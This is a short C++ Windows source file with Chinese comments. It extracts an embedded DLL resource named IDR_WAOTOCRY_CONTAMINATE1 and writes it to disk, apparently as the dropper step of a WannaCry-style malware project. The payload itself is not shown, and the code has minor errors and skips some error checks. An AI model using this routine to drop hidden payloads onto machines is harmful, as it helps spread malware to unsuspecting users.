#include "Un-main.h"
#include "resource.h"


int release_file_dll(LPCWSTR Release_File_Process) {
	// IDR_TESTEXE1是新增资源在resource.h中定义的资源ID号
	HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_WAOTOCRY_CONTAMINATE1), L"dll");
	if (hResInfo == NULL)
	{
		DWORD dwError = GetLastError();
		return -1;
	}

	// 加载资源
	HGLOBAL hResData = LoadResource(NULL, hResInfo);
	// 锁住资源
	LPVOID  pvResData = LockResource(hResData);
	// 获取资源大小
	DWORD dwResSize = SizeofResource(NULL, hResInfo);
	// 创建文件
	HANDLE hFile = CreateFile(Release_File_Process, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL, CREATE_ALWAYS, FILE_SHARE_READ, NULL);
	// 写文件
	DWORD dwWritten = 0;
	WriteFile(hFile, pvResData, dwResSize, &dwWritten, NULL);


	CloseHandle(hFile);
	FreeResource(hResData);
	return 0;
}